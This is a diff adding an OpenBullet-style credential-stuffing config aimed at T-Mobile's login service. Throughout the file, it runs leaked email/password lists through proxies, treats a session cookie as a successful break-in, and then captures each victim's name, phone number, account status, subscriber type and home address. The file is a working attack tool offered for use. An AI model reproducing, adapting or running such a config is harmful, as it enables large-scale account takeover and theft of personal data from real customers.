@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "T-MOBILE Digits",
+  "SuggestedBots": 50,
+  "LastModified": "2018-08-06T23:43:52.6786788+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_LOGIN REQUEST POST " https://gui.t-mobile.com/gui/auth" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>&clientId=WRCMAV_STG&scope=associated_lines+TMO_ID_profile+token_validation+permission&responseType=code&redirectUri=https%3A%2F%2Fwrgweb2.plr.t-mobile.com%2Freg_srv&ref=https%3A%2F%2Fgui.t-mobile.com%2Fgui%2Flogin%3Fclient_id%3DWRCMAV_STG%26scope%3Dassociated_lines%2520TMO_ID_profile%2520token_validation%2520permission%26response_type%3Dcode%26access_type%3DOFFLINE%26redirect_uri%3Dhttps%253A%252F%252Fwrgweb2.plr.t-mobile.com%252Freg_srv%26state%3Dhttps%3A%2F%2Fwrc.t-mobile.com%2Fwrcpro%2Fhome.html%26display%3Dphone2&state=https%3A%2F%2Fwrc.t-mobile.com%2Fwrcpro%2Fhome.html&accessType=OFFLINE&display=phone2" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://gui.t-mobile.com/gui/login?client_id=WRCMAV_STG&scope=associated_lines%20TMO_ID_profile%20token_validation%20permission&response_type=code&access_type=OFFLINE&redirect_uri=https%3A%2F%2Fwrgweb2.plr.t-mobile.com%2Freg_srv&state=https://wrc.t-mobile.com/wrcpro/home.html&display=phone2" 
+  HEADER "Origin: https://gui.t-mobile.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "/gui/incompatible" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "iam_session_id" 
+#PARSE_INFO FUNCTION Constant "<ADDRESS>" -> VAR "INFO" 
+#PARSE_SID PARSE "<INFO>" LR "sessionId=" "&" Recursive=FALSE -> VAR "SID" "" "" 
+#PARSE_CID PARSE "<COOKIES(clientId)>" LR "" "" Recursive=FALSE -> VAR "CID" "" "" 
+#REQUEST_BASIC REQUEST GET "https://wrc.t-mobile.com/wrcpro/homeData.html?sessionId=<SID>&nodeFqdn=wrgweb2.plr.t-mobile.com&clientId=<CID>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#CHECK_USELESS KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "ACC123|[]" 
+#PARSE_STATUS PARSE "<SOURCE>" LR "accountStatus\":\"" "\"" Recursive=FALSE -> CAP "STATUS" "" "" 
+#PARSE_MSISDN PARSE "<SOURCE>" LR "msisdn\":\"1" "\"" Recursive=FALSE -> VAR "MSISDN" "" "" 
+#PARSE_NAME PARSE "<SOURCE>" LR "givenName\":\"" "\"" Recursive=FALSE -> CAP "NAME" "" "" 
+#PARSE_MSISDN PARSE "<SOURCE>" LR "msisdn\":\"1" "\"" Recursive=FALSE -> CAP "NUMBER" "+1 " "" 
+#PARSE_SUB_TYPE PARSE "<SOURCE>" LR "subscriberType\":\"" "\"" Recursive=FALSE -> CAP "SUBTYPE" "" "" 
+#REQUEST_LOCATION REQUEST POST "https://wrc.t-mobile.com/wrcpro/g" AutoRedirect=TRUE 
+  CONTENT "msisdn=<MSISDN>&clientId=<CID>&sessionId=<SID>&nodeFqdn=wrgweb2.plr.t-mobile.com" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://wrc.t-mobile.com/wrcpro/register" 
+  HEADER "Origin: https://wrc.t-mobile.com" 
+#PARSE_ADDRESS PARSE "<SOURCE>" LR "address1\":\"" "\"" Recursive=FALSE -> CAP "ADDRESS" "" "" 
+#PARSE_ZIP PARSE "<SOURCE>" LR "zipCode\":\"" "\"" Recursive=FALSE -> CAP "ZIP" "" "" 
+#PARSE_CITY PARSE "<SOURCE>" LR "city\":\"" "\"" Recursive=FALSE -> CAP "CITY" "" "" 
+#PARSE_STATE PARSE "<SOURCE>" LR "state\":\"" "\"" Recursive=FALSE -> CAP "STATE" "" "" 
